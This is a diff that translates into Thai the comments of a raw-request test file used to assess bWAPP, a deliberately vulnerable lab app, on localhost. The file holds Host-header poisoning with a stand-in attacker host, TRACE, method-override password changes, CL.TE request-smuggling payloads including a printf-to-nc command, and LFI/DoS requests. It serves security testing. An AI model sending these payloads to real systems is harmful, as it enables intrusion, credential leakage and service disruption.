@@ -1,9 +1,9 @@
 ### ============================================================================
-### 09 - Host header poisoning and HTTP method tampering (raw requests)
+### 09 - Host header poisoning และการแก้ HTTP method (raw requests)
 ###
-###   This file uses deliberately malformed requests, so it is kept separate
-###   from the main suites. Most editors' HTTP clients will refuse to send some
-###   of these as-is; the ones they do send are the interesting ones.
+###   ไฟล์นี้ใช้ request ที่ผิดรูปแบบโดยตั้งใจ จึงแยกออกจากชุดหลักไว้ต่างหาก
+###   HTTP client ใน editor ส่วนใหญ่จะปฏิเสธไม่ให้ส่งบางข้อตามที่เขียนไว้
+###   ข้อที่มันยอมส่งนั่นแหละที่น่าสนใจ
 ### ============================================================================
 
 ### ---------------------------------------------------------------------------
@@ -13,57 +13,57 @@ GET {{baseUrl}}/hostheader_1.php HTTP/1.1
 Host: attacker.evil.com
 Cookie: {{authCookie}}
 Accept: text/html
-### Expected: 200, "attacker.evil.com" appears in every absolute URL in the page
+### Expected: 200, "attacker.evil.com" โผล่ใน URL แบบ absolute ทุกอันบนหน้า
 
 
 ### ---------------------------------------------------------------------------
-### HOST-02  X-Forwarded-Host spoofing
-###   If the app trusts proxy headers it will believe this over the real Host.
+### HOST-02  ปลอม X-Forwarded-Host
+###   ถ้าแอปเชื่อ proxy header มันจะเชื่อค่านี้มากกว่า Host จริง
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/hostheader_1.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
 X-Forwarded-Host: attacker.evil.com
 X-Forwarded-For: 203.0.113.9
-### Expected: 200 - if the reflected value changes, the proxy headers are trusted
+### Expected: 200 - ถ้าค่าที่ถูก reflect กลับมาเปลี่ยนไป แปลว่าเชื่อ proxy header
 
 
 ### ---------------------------------------------------------------------------
-### HOST-03  Absolute-URI request line (request smuggling / parser confusion)
-###   A proxy in front of Apache may forward the absolute URI in the Host line
-###   while Apache serves the local vhost - a classic front-end/back-end
-###   disagreement. NOT SENT BY THE RUNNER: HttpWebRequest rewrites an absolute
-###   request target to origin-form, so it cannot send this as written. Send it
-###   with a raw client to test it.
+### HOST-03  request line เป็น absolute URI (request smuggling / parser confusion)
+###   proxy ที่อยู่หน้า Apache อาจ forward absolute URI ไว้ในบรรทัด Host
+###   ขณะที่ Apache ยัง serve vhost local อยู่ - เป็น classic front-end/back-end
+###   ที่ไม่เข้ากัน runner ส่งข้อนี้ไม่ได้: HttpWebRequest แปลง absolute
+###   request target ให้เป็น origin-form การเขียนแบบนี้จึงส่งไม่ออก
+###   ต้องใช้ raw client ยิงเองถึงทดสอบได้
 ### ---------------------------------------------------------------------------
 ### SKIP
-### RUNNER-CANNOT-SEND: an absolute request target is rewritten to origin-form
+### RUNNER-CANNOT-SEND: absolute request target ถูกแปลงเป็น origin-form
 GET http://attacker.evil.com/hostheader_1.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200 - Apache serves the local vhost; a proxy in front of it may not
+### Expected: 200 - Apache serve vhost local แต่ proxy ที่อยู่ข้างหน้าอาจไม่ทำแบบนั้น
 
 
 ### ---------------------------------------------------------------------------
-### VERB-01  TRACE - should be disabled in production
-###   TRACE echoes the request back, including cookies, which is a classic
-###   cross-site tracing attempt and a credential-leak vector.
+### VERB-01  TRACE - ควรปิดไว้ใน production
+###   TRACE จะ echo request กลับมาพร้อม cookie ด้วย นั่นคือ cross-site tracing
+###   แบบคลาสสิกและเป็นช่องทางรั่ว credential
 ### ---------------------------------------------------------------------------
 TRACE {{baseUrl}}/secret.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 405 Method Not Allowed (Apache has TRACE off by default)
+### Expected: 405 Method Not Allowed (Apache ปิด TRACE ไว้เป็นค่าเริ่มต้น)
 
 
 ### ---------------------------------------------------------------------------
-### VERB-02  Method override - PUT on a form endpoint
-###   Some frameworks honour X-HTTP-Method-Override. If bWAPP's routing trusts
-###   the verb, a state change can be triggered from a page that should only
-###   ever produce GET/POST.
-###   Observed: Apache and mod_php accept the PUT and the page renders (200), but
-###   PHP does not populate $_POST for a PUT, so csrf_1.php changes nothing. The
-###   endpoint is verb-agnostic in reach but not in effect - verify by reading
-###   the users table afterwards, not by trusting the 200.
+### VERB-02  Method override - PUT ไปยัง endpoint ที่เป็นฟอร์ม
+###   framework บางตัวเคารพ X-HTTP-Method-Override ถ้า routing ของ bWAPP
+###   เชื่อ verb ก็ยิง state change จากหน้าที่ควรให้ GET/POST อย่างเดียวได้
+###   ผลที่เจอ: Apache กับ mod_php รับ PUT แล้วหน้า render ได้จริง (200) แต่
+###   PHP ไม่เติม $_POST ให้กับ PUT ก็เลยไม่เปลี่ยนอะไร csrf_1.php
+###   endpoint นี้ไม่ผูกกับ verb ในแง่ที่เข้าถึงได้
+###   แต่ไม่ใช่ในแง่ผลลัพธ์ - ต้องไปอ่านตาราง users หลังยิงเพื่อยืนยัน
+###   อย่าเชื่อแค่ตัวเลข 200
 ### ---------------------------------------------------------------------------
 PUT {{baseUrl}}/csrf_1.php HTTP/1.1
 Host: localhost:8443
@@ -74,11 +74,11 @@ Content-Type: application/x-www-form-urlencoded
 password=pwned&password_conf=pwned&form=submit
 ### EXPECT-STATUS: 200|405
 ### EXPECT-NOT: "The password has been changed"
-### Expected: 405, or the page renders but the change silently does nothing
+### Expected: 405, หรือหน้า render ได้แต่การเปลี่ยนแปลงไม่เกิดขึ้นเงียบ ๆ
 
 
 ### ---------------------------------------------------------------------------
-### VERB-03  Method override header on a normal POST
+### VERB-03  Method override header บน POST ปกติ
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/insecure_direct_object_ref_1.php HTTP/1.1
 Host: localhost:8443
@@ -87,20 +87,20 @@ X-HTTP-Method-Override: DELETE
 Content-Type: application/x-www-form-urlencoded
 
 login=A.I.M.&secret=verb-tampered&action=change
-### Expected: 200 - the write happens regardless of the override header,
-###           showing the endpoint's authorization is verb-agnostic
+### Expected: 200 - การเขียนเกิดขึ้นไม่ว่า override header จะเป็นอะไรก็ตาม
+###           แปลว่า authorization ของ endpoint นี้ไม่ผูกกับ verb
 
 
 ### ---------------------------------------------------------------------------
-### SM-01  Request smuggling - CL.TE desync attempt
-###   Classic Content-Length / Transfer-Encoding disagreement. Documented as a
-###   negative result if the server answers 400.
-###   NOT SENT BY THE RUNNER: HttpWebRequest owns both headers and rewrites them,
-###   so it cannot emit a contradictory pair. Use a raw client:
+### SM-01  Request smuggling - ลองทำ desync แบบ CL.TE
+###   คลาสสิกที่ Content-Length / Transfer-Encoding ไม่ตรงกัน ถ้า server
+###   ตอบ 400 ให้บันทึกผลไว้เป็น negative result
+###   runner ส่งข้อนี้ไม่ได้: HttpWebRequest คุม header ทั้งสองและเขียนทับ
+###   จึงยิงคู่ header ที่ขัดกันออกไปไม่ได้ ใช้ raw client แทน:
 ###     printf 'POST /secret.php HTTP/1.1\r\nHost: localhost:8443\r\nContent-Length: 65\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/ HTTP/1.1\r\nHost: localhost:8443\r\nX-Ignore: x\r\n\r\n' | nc localhost 8443
 ### ---------------------------------------------------------------------------
 ### SKIP
-### RUNNER-CANNOT-SEND: Content-Length / Transfer-Encoding are rewritten by the client
+### RUNNER-CANNOT-SEND: client เขียนทับ Content-Length / Transfer-Encoding เอง
 POST {{baseUrl}}/secret.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
@@ -113,15 +113,15 @@ Transfer-Encoding: chunked
 GET /admin/ HTTP/1.1
 Host: localhost:8443
 X-Ignore: x
-### Expected: 400 Bad Request - no desync, Apache 2.4 rejects the ambiguity
+### Expected: 400 Bad Request - ไม่มี desync Apache 2.4 ปฏิเสธความกำกวมนี้
 
 
 ### ---------------------------------------------------------------------------
-### SM-02  Double Transfer-Encoding header obfuscation
-###   Also unsendable by the runner, for the same reason as SM-01.
+### SM-02  ทำ obfuscation ด้วย Transfer-Encoding header ซ้ำสองตัว
+###   runner ส่งไม่ได้เหมือนกัน ด้วยเหตุผลเดียวกับ SM-01
 ### ---------------------------------------------------------------------------
 ### SKIP
-### RUNNER-CANNOT-SEND: duplicate framing headers are collapsed by the client
+### RUNNER-CANNOT-SEND: client ยุบ header ที่ซ้ำกันให้เหลือตัวเดียว
 POST {{baseUrl}}/secret.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
@@ -137,26 +137,26 @@ x=1
 0
 
 
-### Expected: 400/501 - the duplicate header is rejected, not silently merged
+### Expected: 400/501 - header ที่ซ้ำถูกปฏิเสธ ไม่ได้ถูก merge เงียบ ๆ
 
 
 ### ---------------------------------------------------------------------------
-### DOS-01  Resource-exhaustion surface (bWAPP "DoS" bugs)
-###   Only send this against the throwaway Docker container. It is here so the
-###   report can state the vector exists, not to run it repeatedly.
+### DOS-01  พื้นที่ที่ทำให้ resource หมด (บั๊ก "DoS" ของ bWAPP)
+###   ยิงเฉพาะกับ Docker container ที่ใช้แล้วทิ้งเท่านั้น เก็บไว้แค่ให้
+###   รายงานบอกได้ว่ามี vector นี้อยู่จริง ไม่ใช่ให้ยิงซ้ำไปเรื่อย ๆ
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sm_dos_1.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200 - resource consumption bug; do not repeat
+### Expected: 200 - บั๊กที่กิน resource ห้ามยิงซ้ำ
 
 
 ### ---------------------------------------------------------------------------
-### DOS-02  DoS via the included-file bug (LFI to a huge file)
-###   Combines LFI-01 with resource use: read a large file to burn worker time.
-###   Point `page` at /dev/zero only on a disposable container.
+### DOS-02  DoS ผ่านบั๊ก included file (LFI ไปยังไฟล์ขนาดใหญ่)
+###   รวม LFI-01 กับการกิน resource: อ่านไฟล์ใหญ่เพื่อเผาเวลา worker
+###   ชี้ `page` ไปที่ /dev/zero ได้เฉพาะบน container ที่ทิ้งได้
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=/var/www/html/documents/bWAPP_intro.pdf HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, a 5 MB PDF read line-by-line and echoed - worker tied up
+### Expected: 200, PDF 5 MB ที่ถูกอ่านทีละบรรทัดแล้ว echo ออกมา - worker ค้าง
